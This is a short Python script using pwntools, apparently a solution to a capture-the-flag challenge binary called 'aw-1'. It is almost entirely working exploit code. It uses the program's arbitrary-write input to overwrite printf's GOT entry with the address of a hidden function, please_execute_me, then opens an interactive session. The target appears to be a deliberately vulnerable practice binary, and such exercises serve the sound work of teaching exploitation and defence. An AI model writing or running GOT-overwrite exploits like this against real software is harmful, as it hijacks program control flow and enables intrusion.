#!/usr/bin/env python

from pwn import *

"""
$ readelf -a aw-1 | grep -e "printf"
000000602028  000300000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0

info func
0x0000000000400851  please_execute_me
"""

execute = p64(0x400851)

p = process("./aw-1")

# want to write 8 bytes
p.sendline("8")
print(p.recv())

# want to write to printf in GOT
p.sendline("0x000000602028")

# want to write the addr of please_execute_me
p.sendline(execute)

p.interactive()
